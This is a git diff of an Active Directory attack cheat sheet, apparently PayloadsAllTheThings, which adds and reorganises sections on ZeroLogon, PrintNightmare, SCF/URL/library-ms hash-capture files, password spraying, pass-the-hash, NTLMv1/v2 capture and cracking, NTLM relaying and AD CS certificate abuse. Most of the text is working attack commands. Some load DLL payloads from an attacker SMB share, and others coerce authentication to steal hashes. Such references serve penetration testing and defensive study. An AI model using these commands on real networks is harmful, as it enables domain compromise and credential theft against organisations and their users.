@@ -12,10 +12,14 @@
   - [Most common paths to AD compromise](#most-common-paths-to-ad-compromise)
     - [MS14-068 (Microsoft Kerberos Checksum Validation Vulnerability)](#ms14-068-microsoft-kerberos-checksum-validation-vulnerability)
     - [From CVE to SYSTEM shell on DC](#from-cve-to-system-shell-on-dc)
-      - [CVE-2020-1472 ZeroLogon](#cve-2020-1472-zerologon)
-      - [CVE-2021-1675 PrintNightmare](#cve-2021-1675-printnightmare)
+      - [ZeroLogon](#zerologon)
+      - [PrintNightmare](#printnightmare)
     - [Open Shares](#open-shares)
     - [SCF and URL file attack against writeable share](#scf-and-url-file-attack-against-writeable-share)
+      - [SCF Files](#scf-files)
+      - [URL Files](#url-files)
+      - [Windows Library Files](#windows-library-files)
+      - [Windows Search Connectors Files](#windows-search-connectors-files)
     - [Passwords in SYSVOL & Group Policy Preferences](#passwords-in-sysvol-&-group-policy-preferences)
     - [Exploit Group Policy Objects GPO](#exploit-group-policy-objects-gpo)
       - [Find vulnerable GPO](#find-vulnerable-gpo)
@@ -54,14 +58,20 @@
     - [OverPass-the-Hash (pass the key)](#overpass-the-hash-pass-the-key)
       - [Using impacket](#using-impacket)
       - [Using Rubeus](#using-rubeus)
-    - [Capturing and cracking NTLMv2 hashes](#capturing-and-cracking-ntlmv2-hashes)
+    - [Capturing and cracking Net-NTLMv1/NTLMv1 hashes](#capturing-and-cracking-net-ntlmv1ntlmv1-hashes)
+    - [Capturing and cracking Net-NTLMv2/NTLMv2 hashes](#capturing-and-cracking-net-ntlmv2ntlmv2-hashes)
     - [Man-in-the-Middle attacks & relaying](#man-in-the-middle-attacks--relaying)
       - [MS08-068 NTLM reflection](#ms08-068-ntlm-reflection)
       - [SMB Signing Disabled and IPv4](#smb-signing-disabled-and-ipv4)
       - [SMB Signing Disabled and IPv6](#smb-signing-disabled-and-ipv6)
       - [Drop the MIC](#drop-the-mic)
       - [Ghost Potato - CVE-2019-1384](#ghost-potato---cve-2019-1384)
-      - [AD CS Relay Attack](#ad-cs-relay-attack)
+      - [RemotePotato0 DCOM DCE RPC relay](#remotepotato0-dcom-dce-rpc-relay)
+      - [Relay delegation with mitm6](#relay-delegation-with-mitm6)
+    - [Active Directory Certificate Services](#active-directory-certificate-services)
+      - [ESC1 - Misconfigured Certificate Templates](#esc1---misconfigured-certificate-templates)
+      - [ESC2 - Misconfigured Certificate Templates](#esc2---misconfigured-certificate-templates)
+      - [ESC8 - AD CS Relay Attack](#esc8---ad-cs-relay-attack)
     - [Dangerous Built-in Groups Usage](#dangerous-built-in-groups-usage)
     - [Abusing Active Directory ACLs/ACEs](#abusing-active-directory-aclsaces)
       - [GenericAll](#genericall)
@@ -80,10 +90,11 @@
     - [Child Domain to Forest Compromise - SID Hijacking](#child-domain-to-forest-compromise---sid-hijacking)
     - [Forest to Forest Compromise - Trust Ticket](#forest-to-forest-compromise---trust-ticket)
     - [Kerberos Unconstrained Delegation](#kerberos-unconstrained-delegation)
+      - [SpoolService Abuse with Unconstrained Delegation](#spoolservice-abuse-with-unconstrained-delegation)
+      - [MS-EFSRPC Abuse with Unconstrained Delegation](#ms---efsrpc-abuse-with-unconstrained-delegation)
     - [Kerberos Constrained Delegation](#kerberos-constrained-delegation)
     - [Kerberos Resource Based Constrained Delegation](#kerberos-resource-based-constrained-delegation)
     - [Kerberos Bronze Bit Attack - CVE-2020-17049](#kerberos-bronze-bit-attack---cve-2020-17049)
-    - [Relay delegation with mitm6](#relay-delegation-with-mitm6)
     - [PrivExchange attack](#privexchange-attack)
     - [PXE Boot image attack](#pxe-boot-image-attack)
     - [DSRM Credentials](#dsrm-credentials)
@@ -506,7 +517,9 @@ Windows> net time /domain /set
 > Sometimes you will find a Domain Controller without the latest patches installed, use the newest CVE to gain a SYSTEM shell on it. If you have a "normal user" shell on the DC you can also try to elevate your privileges using one of the methods listed in [Windows - Privilege Escalation](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
 
 
-#### CVE-2020-1472 ZeroLogon
+#### ZeroLogon
+
+> CVE-2020-1472
 
 White Paper from Secura : https://www.secura.com/pathtoimg.php?id=2055
 
@@ -521,13 +534,16 @@ Exploit steps from the white paper
 
 * `cve-2020-1472-exploit.py` - Python script from dirkjanm
   ```powershell
+	# Check (https://github.com/SecuraBV/CVE-2020-1472)
+	proxychains python3 zerologon_tester.py DC01 172.16.1.5
+	
   $ git clone https://github.com/dirkjanm/CVE-2020-1472.git
 
   # Activate a virtual env to install impacket
   $ python3 -m venv venv
   $ source venv/bin/activate
   $ pip3 install .
-
+	
   # Exploit the CVE (https://github.com/dirkjanm/CVE-2020-1472/blob/master/cve-2020-1472-exploit.py)
   proxychains python3 cve-2020-1472-exploit.py DC01 172.16.1.5
 
@@ -578,7 +594,9 @@ Exploit steps from the white paper
   lsadump::postzerologon /target:10.10.10.10 /account:DC01$
   ```
 
-#### CVE-2021-1675 - CVE-2021-34527 - PrintNightmare
+#### PrintNightmare
+
+> CVE-2021-1675 / CVE-2021-34527
 
 The DLL will be stored in `C:\Windows\System32\spool\drivers\x64\3\`.
 The exploit will execute the DLL either from the local filesystem or a remote share.
@@ -591,39 +609,64 @@ Requirements:
 * Server with registry key `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA` = (DWORD) 0
 
 
-```powershell
-# https://github.com/cube0x0/CVE-2021-1675 - require a modified Impacket: https://github.com/cube0x0/impacket
-python3 ./CVE-2021-1675.py hackit.local/domain_user:Pass123@192.168.1.10 '\\192.168.1.215\smb\addCube.dll'
-python3 ./CVE-2021-1675.py hackit.local/domain_user:Pass123@192.168.1.10 'C:\addCube.dll'
-## LPE
-SharpPrintNightmare.exe C:\addCube.dll
-## RCE using existing context
-SharpPrintNightmare.exe '\\192.168.1.215\smb\addCube.dll' 'C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_addb31f9bff9e936\Amd64\UNIDRV.DLL' '\\192.168.1.20'
-## RCE using runas /netonly
-SharpPrintNightmare.exe '\\192.168.1.215\smb\addCube.dll'  'C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_83aa9aebf5dffc96\Amd64\UNIDRV.DLL' '\\192.168.1.10' hackit.local domain_user Pass123
+**Detect the vulnerability**:
+* Impacket - [rpcdump](https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/rpcdump.py)
+  ```ps1
+  python3 ./rpcdump.py @10.0.2.10 | egrep 'MS-RPRN|MS-PAR'
+  Protocol: [MS-RPRN]: Print System Remote Protocol
+  ```
+* [It Was All A Dream](https://github.com/byt3bl33d3r/ItWasAllADream) 
+  ```ps1
+  git clone https://github.com/byt3bl33d3r/ItWasAllADream
+  cd ItWasAllADream && poetry install && poetry shell
+  itwasalladream -u user -p Password123 -d domain 10.10.10.10/24
+  docker run -it itwasalladream -u username -p Password123 -d domain 10.10.10.10
+  ```
 
-# https://github.com/calebstewart/CVE-2021-1675
-## LPE only (PS1 + DLL)
-Import-Module .\cve-2021-1675.ps1
-Invoke-Nightmare # add user `adm1n`/`P@ssw0rd` in the local admin group by default
-Invoke-Nightmare -DriverName "Dementor" -NewUser "d3m3nt0r" -NewPassword "AzkabanUnleashed123*" 
-Invoke-Nightmare -DLL "C:\absolute\path\to\your\bindshell.dll"
+**Trigger the exploit**: 
 
-# Mimikatz - https://github.com/gentilkiwi/mimikatz/releases/tag/2.2.0-20210705
-## LPE
-misc::printnightmare /server:DC01 /library:C:\Users\user1\Documents\mimispool.dll
-## RCE
-misc::printnightmare /server:CASTLE /library:\\10.0.2.12\smb\beacon.dll /authdomain:LAB /authuser:Username /authpassword:Password01 /try:50
+**NOTE**: The payload can be hosted on Impacket SMB server since [PR #1109](https://github.com/SecureAuthCorp/impacket/pull/1109): `python3 ./smbserver.py share /tmp/smb/` or using [Invoke-BuildAnonymousSMBServer](https://github.com/3gstudent/Invoke-BuildAnonymousSMBServer/blob/main/Invoke-BuildAnonymousSMBServer.ps1) : `Import-Module .\Invoke-BuildAnonymousSMBServer.ps1; Invoke-BuildAnonymousSMBServer -Path C:\Share -Mode Enable`
 
-# It Was All A Dream - https://github.com/byt3bl33d3r/ItWasAllADream
-# PrintNightmare scanner/checker (no exploit)
-## RCE only
-git clone https://github.com/byt3bl33d3r/ItWasAllADream
-cd ItWasAllADream && poetry install && poetry shell
-itwasalladream -u user -p password -d domain 192.168.1.0/24
-```
+* [SharpNightmare](https://github.com/cube0x0/CVE-2021-1675)
+  ```powershell
+  # require a modified Impacket: https://github.com/cube0x0/impacket
+  python3 ./CVE-2021-1675.py hackit.local/domain_user:Pass123@192.168.1.10 '\\192.168.1.215\smb\addCube.dll'
+  python3 ./CVE-2021-1675.py hackit.local/domain_user:Pass123@192.168.1.10 'C:\addCube.dll'
+  ## LPE
+  SharpPrintNightmare.exe C:\addCube.dll
+  ## RCE using existing context
+  SharpPrintNightmare.exe '\\192.168.1.215\smb\addCube.dll' 'C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_addb31f9bff9e936\Amd64\UNIDRV.DLL' '\\192.168.1.20'
+  ## RCE using runas /netonly
+  SharpPrintNightmare.exe '\\192.168.1.215\smb\addCube.dll'  'C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_83aa9aebf5dffc96\Amd64\UNIDRV.DLL' '\\192.168.1.10' hackit.local domain_user Pass123
+  ```
+* [Invoke-Nightmare](https://github.com/calebstewart/CVE-2021-1675)
+  ```powershell
+  ## LPE only (PS1 + DLL)
+  Import-Module .\cve-2021-1675.ps1
+  Invoke-Nightmare # add user `adm1n`/`P@ssw0rd` in the local admin group by default
+  Invoke-Nightmare -DriverName "Dementor" -NewUser "d3m3nt0r" -NewPassword "AzkabanUnleashed123*" 
+  Invoke-Nightmare -DLL "C:\absolute\path\to\your\bindshell.dll"
+  ```
+* [Mimikatz v2.2.0-20210709+](https://github.com/gentilkiwi/mimikatz/releases)
+  ```powershell
+  ## LPE
+  misc::printnightmare /server:DC01 /library:C:\Users\user1\Documents\mimispool.dll
+  ## RCE
+  misc::printnightmare /server:CASTLE /library:\\10.0.2.12\smb\beacon.dll /authdomain:LAB /authuser:Username /authpassword:Password01 /try:50
+  ```
+* [PrintNightmare - @outflanknl](https://github.com/outflanknl/PrintNightmare)
+  ```powershell
+  PrintNightmare [target ip or hostname] [UNC path to payload Dll] [optional domain] [optional username] [optional password]
+  ```
 
-**NOTE**: The payload can be hosted on Impacket SMB server since [PR #1109](https://github.com/SecureAuthCorp/impacket/pull/1109) .
+**Debug informations**
+
+| Error  | Message             | Debug                                    |
+|--------|---------------------|------------------------------------------|
+| 0x5    | rpc_s_access_denied | Permissions on the file in the SMB share |
+| 0x525  | ERROR_NO_SUCH_USER  | The specified account does not exist.    |
+| 0x180  | unknown error code  | Share is not SMB2                        |
+
 
 ### Open Shares
 
@@ -679,6 +722,22 @@ itwasalladream -u user -p password -d domain 192.168.1.0/24
 
 ### SCF and URL file attack against writeable share
 
+Theses attacks can be automated with [Farmer.exe](https://github.com/mdsecactivebreach/Farmer) and [Crop.exe](https://github.com/mdsecactivebreach/Farmer/tree/main/crop)
+
+```ps1
+# Farmer to receive auth
+farmer.exe <port> [seconds] [output]
+farmer.exe 8888 0 c:\windows\temp\test.tmp # undefinitely
+farmer.exe 8888 60 # one minute
+
+# Crop can be used to create various file types that will trigger SMB/WebDAV connections for poisoning file shares during hash collection attacks
+crop.exe <output folder> <output filename> <WebDAV server> <LNK value> [options]
+Crop.exe \\\\fileserver\\common mdsec.url \\\\workstation@8888\\mdsec.ico
+Crop.exe \\\\fileserver\\common mdsec.library-ms \\\\workstation@8888\\mdsec
+```
+
+#### SCF Files
+
 Drop the following `@something.scf` file inside a share and start listening with Responder : `responder -wrf --lm -v -I eth0`
 
 ```powershell
@@ -689,6 +748,8 @@ IconFile=\\10.10.10.10\Share\test.ico
 Command=ToggleDesktop
 ```
 
+#### URL Files
+
 This attack also works with `.url` files and `responder -I eth0 -v`.
 
 ```powershell
@@ -697,6 +758,53 @@ URL=whatever
 WorkingDirectory=whatever
 IconFile=\\10.10.10.10\%USERNAME%.icon
 IconIndex=1
+```
+
+#### Windows Library Files 
+
+> Windows Library Files (.library-ms)
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<libraryDescription xmlns="<http://schemas.microsoft.com/windows/2009/library>">
+  <name>@windows.storage.dll,-34582</name>
+  <version>6</version>
+  <isLibraryPinned>true</isLibraryPinned>
+  <iconReference>imageres.dll,-1003</iconReference>
+  <templateInfo>
+    <folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
+  </templateInfo>
+  <searchConnectorDescriptionList>
+    <searchConnectorDescription>
+      <isDefaultSaveLocation>true</isDefaultSaveLocation>
+      <isSupported>false</isSupported>
+      <simpleLocation>
+        <url>\\\\workstation@8888\\folder</url>
+      </simpleLocation>
+    </searchConnectorDescription>
+  </searchConnectorDescriptionList>
+</libraryDescription>
+```
+
+#### Windows Search Connectors Files
+
+> Windows Search Connectors (.searchConnector-ms)
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<searchConnectorDescription xmlns="<http://schemas.microsoft.com/windows/2009/searchConnector>">
+    <iconReference>imageres.dll,-1002</iconReference>
+    <description>Microsoft Outlook</description>
+    <isSearchOnlyItem>false</isSearchOnlyItem>
+    <includeInStartMenuScope>true</includeInStartMenuScope>
+    <iconReference>\\\\workstation@8888\\folder.ico</iconReference>
+    <templateInfo>
+        <folderType>{91475FE5-586B-4EBA-8D75-D17434B8CDF6}</folderType>
+    </templateInfo>
+    <simpleLocation>
+        <url>\\\\workstation@8888\\folder</url>
+    </simpleLocation>
+</searchConnectorDescription>
 ```
 
 
@@ -1033,11 +1141,12 @@ Password spraying refers to the attack method that takes a large number of usern
 
 Most of the time the best passwords to spray are :
 
-- P@ssw0rd01, Password123, mimikatz
+- P@ssw0rd01, Password123, Password1, Hello123, mimikatz
 - Welcome1/Welcome01
 - $Companyname1 : $Microsoft1
-- SeasonYear : Winter2019*,Spring2020!,Summer2018? 
+- SeasonYear : Winter2019*, Spring2020!, Summer2018?, Summer2020, July2020!
 - Default AD password with simple mutations such as number-1, special character iteration (*,?,!,#)
+
 
 #### Kerberos pre-auth bruteforcing
 
@@ -1045,53 +1154,51 @@ Using `kerbrute`, a tool to perform Kerberos pre-auth bruteforcing.
 
 > Kerberos pre-authentication errors are not logged in Active Directory with a normal **Logon failure event (4625)**, but rather with specific logs to **Kerberos pre-authentication failure (4771)**.
 
-```powershell
-# Username bruteforce
-root@kali:~$ ./kerbrute_linux_amd64 userenum -d domain.local --dc 10.10.10.10 usernames.txt
-
-# Password brute
-root@kali:~$ ./kerbrute_linux_amd64 bruteuser -d domain.local --dc 10.10.10.10 rockyou.txt username
-
-# Password spray
-root@kali:~$ ./kerbrute_linux_amd64 passwordspray -d domain.local --dc 10.10.10.10 domain_users.txt Password123
-root@kali:~$ ./kerbrute_linux_amd64 passwordspray -d domain.local --dc 10.10.10.10 domain_users.txt rockyou.txt
-root@kali:~$ ./kerbrute_linux_amd64 passwordspray -d domain.local --dc 10.10.10.10 domain_users.txt '123456' -v --delay 100 -o kerbrute-passwordspray-123456.log
-```
+* Username bruteforce
+  ```powershell
+  root@kali:~$ ./kerbrute_linux_amd64 userenum -d domain.local --dc 10.10.10.10 usernames.txt
+  ```
+* Password bruteforce
+  ```powershell
+  root@kali:~$ ./kerbrute_linux_amd64 bruteuser -d domain.local --dc 10.10.10.10 rockyou.txt username
+  ```
+* Password spray
+  ```powershell
+  root@kali:~$ ./kerbrute_linux_amd64 passwordspray -d domain.local --dc 10.10.10.10 domain_users.txt Password123
+  root@kali:~$ ./kerbrute_linux_amd64 passwordspray -d domain.local --dc 10.10.10.10 domain_users.txt rockyou.txt
+  root@kali:~$ ./kerbrute_linux_amd64 passwordspray -d domain.local --dc 10.10.10.10 domain_users.txt '123456' -v --delay 100 -o kerbrute-passwordspray-123456.log
+  ```
 
 #### Spray a pre-generated passwords list
 
-Using `crackmapexec` and `mp64` to generate passwords and spray them against SMB services on the network.
-
-```powershell
-crackmapexec smb 10.0.0.1/24 -u Administrator -p `(./mp64.bin Pass@wor?l?a)`
-```
-
-Using `DomainPasswordSpray` to spray a password against all users of a domain.
-
-```powershell
-# https://github.com/dafthack/DomainPasswordSpray
-Invoke-DomainPasswordSpray -Password Summer2021!
-
-# /!\ be careful with the account lockout !
-Invoke-DomainPasswordSpray -UserList users.txt -Domain domain-name -PasswordList passlist.txt -OutFile sprayed-creds.txt
-
-```
+* Using `crackmapexec` and `mp64` to generate passwords and spray them against SMB services on the network.
+  ```powershell
+  crackmapexec smb 10.0.0.1/24 -u Administrator -p `(./mp64.bin Pass@wor?l?a)`
+  ```
+* Using `DomainPasswordSpray` to spray a password against all users of a domain.
+  ```powershell
+  # https://github.com/dafthack/DomainPasswordSpray
+  Invoke-DomainPasswordSpray -Password Summer2021!
+  # /!\ be careful with the account lockout !
+  Invoke-DomainPasswordSpray -UserList users.txt -Domain domain-name -PasswordList passlist.txt -OutFile sprayed-creds.txt
+  ```
+* Using `SMBAutoBrute`.
+  ```powershell
+  Invoke-SMBAutoBrute -UserList "C:\ProgramData\admins.txt" -PasswordList "Password1, Welcome1, 1qazXDR%+" -LockoutThreshold 5 -ShowVerbose
+  ```
 
 #### Spray passwords against the RDP service
 
-Using RDPassSpray to target RDP services.
-
-```powershell
-git clone https://github.com/xFreed0m/RDPassSpray
-python3 RDPassSpray.py -u [USERNAME] -p [PASSWORD] -d [DOMAIN] -t [TARGET IP]
-```
-
-Using hydra and ncrack to target RDP services.
-
-```powershell
-hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt rdp://10.10.10.10
-ncrack –connection-limit 1 -vv --user administrator -P password-file.txt rdp://10.10.10.10
-```
+* Using RDPassSpray to target RDP services.
+  ```powershell
+  git clone https://github.com/xFreed0m/RDPassSpray
+  python3 RDPassSpray.py -u [USERNAME] -p [PASSWORD] -d [DOMAIN] -t [TARGET IP]
+  ```
+* Using hydra and ncrack to target RDP services.
+  ```powershell
+  hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt rdp://10.10.10.10
+  ncrack –connection-limit 1 -vv --user administrator -P password-file.txt rdp://10.10.10.10
+  ```
 
 #### BadPwdCount attribute
 
@@ -1356,8 +1463,16 @@ Any valid domain user can request a kerberos ticket (TGS) for any domain service
 
 * [Rubeus](https://github.com/GhostPack/Rubeus)
   ```powershell
+  # Stats
+  Rubeus.exe kerberoast /stats
+  -------------------------------------   ----------------------------------
+  | Supported Encryption Type | Count |  | Password Last Set Year | Count |
+  -------------------------------------  ----------------------------------
+  | RC4_HMAC_DEFAULT          | 1     |  | 2021                   | 1     |
+  -------------------------------------  ----------------------------------
+
   # Kerberoast (RC4 ticket)
-  .\rubeus.exe kerberoast /creduser:DOMAIN\JOHN /credpassword:MyP@ssW0RD /outfile:hash.txt
+  Rubeus.exe kerberoast /creduser:DOMAIN\JOHN /credpassword:MyP@ssW0RD /outfile:hash.txt
 
   # Kerberoast (AES ticket)
   # Accounts with AES enabled in msDS-SupportedEncryptionTypes will have RC4 tickets requested.
@@ -1377,6 +1492,13 @@ Any valid domain user can request a kerberos ticket (TGS) for any domain service
   ```powershell
   ./bifrost -action asktgs -ticket doIF<...snip...>QUw= -service host/dc1-lab.lab.local -kerberoast true
   ```
+
+* [targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast)
+  ```powershell
+  # for each user without SPNs, it tries to set one (abuse of a write permission on the servicePrincipalName attribute), 
+  # print the "kerberoast" hash, and delete the temporary SPN set for that operation
+  targetedKerberoast.py [-h] [-v] [-q] [-D TARGET_DOMAIN] [-U USERS_FILE] [--request-user username] [-o OUTPUT_FILE] [--use-ldaps] [--only-abuse] [--no-abuse] [--dc-ip ip address] [-d DOMAIN] [-u USER] [-k] [--no-pass | -p PASSWORD | -H [LMHASH:]NTHASH | --aes-key hex key]
+  ``` 
 
 
 Then crack the ticket using the correct hashcat mode (`$krb5tgs$23`= `etype 23`) 
@@ -1482,35 +1604,31 @@ Whisker.exe remove /target:computername$ /domain:constoso.local /dc:dc1.contoso.
 
 The types of hashes you can use with Pass-The-Hash are NT or NTLM hashes. Since Windows Vista, attackers have been unable to pass-the-hash to local admin accounts that weren’t the built-in RID 500.
 
-```powershell
-use exploit/windows/smb/psexec
-set RHOST 10.2.0.3
-set SMBUser jarrieta
-set SMBPass nastyCutt3r  
-# NOTE1: The password can be replaced by a hash to execute a `pass the hash` attack.
-# NOTE2: Require the full NTLM hash, you may need to add the "blank" LM (aad3b435b51404eeaad3b435b51404ee)
-set PAYLOAD windows/meterpreter/bind_tcp
-run
-shell
-```
-
-or with crackmapexec
-
-```powershell
-cme smb 10.2.0.2 -u jarrieta -H 'aad3b435b51404eeaad3b435b51404ee:489a04c09a5debbc9b975356693e179d' -x "whoami"
-also works with net range : cme smb 10.2.0.2/24 ... 
-```
-
-or with psexec
-
-```powershell
-proxychains python ./psexec.py jarrieta@10.2.0.2 -hashes :489a04c09a5debbc9b975356693e179d
-```
-
-or with the builtin Windows RDP and mimikatz
-```powershell
-sekurlsa::pth /user:<user name> /domain:<domain name> /ntlm:<the user's ntlm hash> /run:"mstsc.exe /restrictedadmin"
-```
+* Metasploit
+  ```powershell
+  use exploit/windows/smb/psexec
+  set RHOST 10.2.0.3
+  set SMBUser jarrieta
+  set SMBPass nastyCutt3r  
+  # NOTE1: The password can be replaced by a hash to execute a `pass the hash` attack.
+  # NOTE2: Require the full NTLM hash, you may need to add the "blank" LM (aad3b435b51404eeaad3b435b51404ee)
+  set PAYLOAD windows/meterpreter/bind_tcp
+  run
+  shell
+  ```
+* CrackMapExec
+  ```powershell
+  cme smb 10.2.0.2/24 -u jarrieta -H 'aad3b435b51404eeaad3b435b51404ee:489a04c09a5debbc9b975356693e179d' -x "whoami"
+  ```
+* Impacket suite
+  ```powershell
+  proxychains python ./psexec.py jarrieta@10.2.0.2 -hashes :489a04c09a5debbc9b975356693e179d
+  ```
+* Windows RDP and mimikatz
+  ```powershell
+  sekurlsa::pth /user:Administrator /domain:contoso.local /ntlm:b73fdfe10e87b4ca5c0d957f81de6863
+  sekurlsa::pth /user:<user name> /domain:<domain name> /ntlm:<the users ntlm hash> /run:"mstsc.exe /restrictedadmin"
+  ```
 
 You can extract the local **SAM database** to find the local administrator hash :
 
@@ -1555,7 +1673,54 @@ klist
 .\Rubeus.exe asktgt /user:Administrator /rc4:[NTLMHASH] /createnetonly:C:\Windows\System32\cmd.exe
 ```
 
-### Capturing and cracking NTLMv2 hashes
+
+
+### Capturing and cracking Net-NTLMv1/NTLMv1 hashes
+
+> Net-NTLM (NTLMv1) hashes are used for network authentication (they are derived from a challenge/response algorithm and are based on the user's NT hash. 
+
+:information_source: : Coerce a callback using PetitPotam or SpoolSample on an affected machine and downgrade the authentication to **NetNTLMv1 Challenge/Response authentication**. This uses the outdated encryption method DES to protect the NT/LM Hashes.
+
+**Requirements**:
+* LmCompatibilityLevel = 0x1: Send LM & NTLM (`reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v lmcompatibilitylevel`)
+
+**Exploitation**:
+* Capturing using Responder: Edit the /etc/responder/Responder.conf file to include the magical **1122334455667788** challenge
+    ```ps1
+    HTTPS = On
+    DNS = On
+    LDAP = On
+    ...
+    ; Custom challenge.
+    ; Use "Random" for generating a random challenge for each requests (Default)
+    Challenge = 1122334455667788
+    ```
+* Fire Responder: `responder -I eth0 --lm`
+* Force a callback:
+    ```ps1
+    PetitPotam.exe Responder-IP DC-IP # Patched around August 2021
+    PetitPotam.py -u Username -p Password -d Domain -dc-ip DC-IP Responder-IP DC-IP # Not patched for authenticated users
+    ```
+* If you got some `NTLMv1 hashes`, you need to format them to submit them on [crack.sh](https://crack.sh/netntlm/)
+    ```ps1
+    username::hostname:response:response:challenge -> NTHASH:response
+    NTHASH:F35A3FE17DCB31F9BE8A8004B3F310C150AFA36195554972
+    ```
+* Or crack them with Hashcat / John The Ripper
+    ```ps1
+    john --format=netntlm hash.txt
+    hashcat -m 5500 -a 3 hash.txt
+    ```
+* Now you can DCSync using the Pass-The-Hash with the DC machine account
+
+:warning: NTLMv1 with SSP(Security Support Provider) changes the server challenge and is not quite ideal for the attack, but it can be used.
+
+
+**Mitigations**: 
+
+* Set the Lan Manager authentication level to `Send NTLMv2 responses only. Refuse LM & NTLM`
+
+### Capturing and cracking Net-NTLMv2/NTLMv2 hashes
 
 If any user in the network tries to access a machine and mistype the IP or the name, Responder will answer for it and ask for the NTLMv2 hash to access the resource. Responder will poison `LLMNR`, `MDNS` and `NETBIOS` requests on the network.
 
@@ -1569,6 +1734,14 @@ PS > .\inveighzero.exe -FileOutput Y -NBNS Y -mDNS Y -Proxy Y -MachineAccounts Y
 # https://github.com/EmpireProject/Empire/blob/master/data/module_source/collection/Invoke-Inveigh.ps1
 PS > Invoke-Inveigh [-IP '10.10.10.10'] -ConsoleOutput Y -FileOutput Y -NBNS Y –mDNS Y –Proxy Y -MachineAccounts Y
 ```
+
+Crack the hashes with Hashcat / John The Ripper
+
+```ps1
+john --format=netntlmv2 hash.txt
+hashcat -m 5600 -a 3 hash.txt
+```
+
 
 ### Man-in-the-Middle attacks & relaying
 
@@ -1706,7 +1879,7 @@ python2 scanMIC.py 'DOMAIN/USERNAME:PASSWORD@TARGET'
 
 #### Ghost Potato - CVE-2019-1384
 
-Prerequisites:
+Requirements:
 * User must be a member of the local Administrators group
 * User must be a member of the Backup Operators group
 * Token must be elevated
@@ -1717,28 +1890,156 @@ Using a modified version of ntlmrelayx : https://shenaniganslabs.io/files/impack
 ntlmrelayx -smb2support --no-smb-server --gpotato-startup rat.exe
 ```
 
+#### RemotePotato0 DCOM DCE RPC relay 
 
-#### AD CS Relay Attack
+> It abuses the DCOM activation service and trigger an NTLM authentication of the user currently logged on in the target machine
 
-https://github.com/SecureAuthCorp/impacket/pull/1101
+Requirements:
+- a shell in session 0 (e.g. WinRm shell or SSH shell)
+- a privileged user is logged on in the session 1 (e.g. a Domain Admin user)
 
-1. Run the ntlmrelayx.py and set your Certificate Authority (CA) as a target
-    ```powershell
-    python3 ntlmrelayx.py -t http://<ca-server>/certsrv/certfnsh.asp -smb2support --adcs
-    python3 ntlmrelayx.py -t http://cs1.lab.local/certsrv/certfnsh.asp -smb2support --adcs
+```powershell
+# https://github.com/antonioCoco/RemotePotato0/
+Terminal> sudo socat TCP-LISTEN:135,fork,reuseaddr TCP:192.168.83.131:9998 & # Can be omitted for Windows Server <= 2016
+Terminal> sudo ntlmrelayx.py -t ldap://192.168.83.135 --no-wcf-server --escalate-user winrm_user_1
+Session0> RemotePotato0.exe -r 192.168.83.130 -p 9998 -s 2
+Terminal> psexec.py 'LAB/winrm_user_1:Password123!@192.168.83.135'
+```
+
+
+#### Relay delegation with mitm6
+
+Requirements: 
+- IPv6 enabled (Windows prefers IPV6 over IPv4)
+- LDAP over TLS (LDAPS)
+
+> ntlmrelayx relays the captured credentials to LDAP on the domain controller, uses that to create a new machine account, print the account's name and password and modifies the delegation rights of it.
+
+```powershell
+git clone https://github.com/fox-it/mitm6.git 
+cd /opt/tools/mitm6
+pip install .
+
+mitm6 -hw ws02 -d lab.local --ignore-nofqnd
+ntlmrelayx.py -t ldaps://dc01.lab.local --delegate-access --no-smb-server -wh attacker-wpad
+then use rubeus with s4u to relay the delegation
+```
+
+
+### Active Directory Certificate Services
+
+#### ESC1 - Misconfigured Certificate Templates
+
+> Domain Users can enroll in the **VulnTemplate** template, which can be used for client authentication and has **ENROLLEE_SUPPLIES_SUBJECT** set. This allows anyone to enroll in this template and specify an arbitrary Subject Alternative Name (i.e. as a DA). Allows additional identities to be bound to a certificate beyond the Subject.
+
+Requirements:
+*  Template that allows for AD authentication
+* **ENROLLEE_SUPPLIES_SUBJECT** flag
+* [PKINIT] Client Authentication, Smart Card Logon, Any Purpose, or No EKU (Extended/Enhanced Key Usage) 
+
+Exploitation:
+* Use [Certify.exe](https://github.com/GhostPack/Certify) to see if there are any vulnerable templates
+    ```ps1
+    Certify.exe find /vulnerable
+    or
+    PS> Get-ADObject -LDAPFilter '(&(objectclass=pkicertificatetemplate)(!(mspki-enrollment-flag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-ra-signature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2) (pkiextendedkeyusage=1.3.6.1.5.2.3.4))(mspki-certificate-name-flag:1.2.840.113556.1.4.804:=1))' -SearchBase 'CN=Configuration,DC=lab,DC=local'
     ```
-2. Exploit the print spooler bug
+* Use Certify or [Certi](https://github.com/eloypgz/certi) to request a Certificate and add an alternative name (user to impersonate)
+    ```ps1
+    # request certificates for the machine account by executing Certify with the "/machine" argument from an elevated command prompt.
+    Certify.exe request /ca:dc.domain.local\domain-DC-CA /template:VulnTemplate /altname:domadmin
+    certi.py req 'contoso.local/Anakin@dc01.contoso.local' contoso-DC01-CA -k -n --alt-name han --template UserSAN
+    ```
+* Use OpenSSL and convert the certificate, do not enter a password
+    ```ps1
+    openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
+    ```
+* Move the cert.pfx to the target machine filesystem and request a TGT for the altname user using Rubeus
+    ```ps1
+    Rubeus.exe asktgt /user:domadmin /certificate:C:\Temp\cert.pfx
+    ```
+
+**WARNING**: These certificates will still be usable even if the user or computer resets their password!
+
